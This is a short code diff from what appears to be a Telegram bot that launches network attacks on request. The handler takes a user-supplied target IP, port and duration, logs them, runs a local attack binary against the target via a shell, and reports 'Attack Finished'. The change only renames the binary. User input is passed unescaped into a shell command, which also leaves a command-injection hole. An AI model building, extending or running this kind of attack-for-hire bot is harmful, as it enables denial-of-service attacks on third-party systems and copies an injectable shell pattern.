@@ -172,7 +172,7 @@ def handle_attack_command(message):
                 log_command(user_id, target_ip, target_port, duration)
 
                 # Simulate the attack command (replace with actual command if needed)
-                full_command = f"./bgmi {target_ip} {target_port} {duration}"
+                full_command = f"./desi {target_ip} {target_port} {duration}"
                 subprocess.run(full_command, shell=True)
 
                 bot.reply_to(message, f"🚀 Attack Finished. 🚀 \n\nTarget: {target_ip}\nPort: {target_port}\nTime: {duration}")
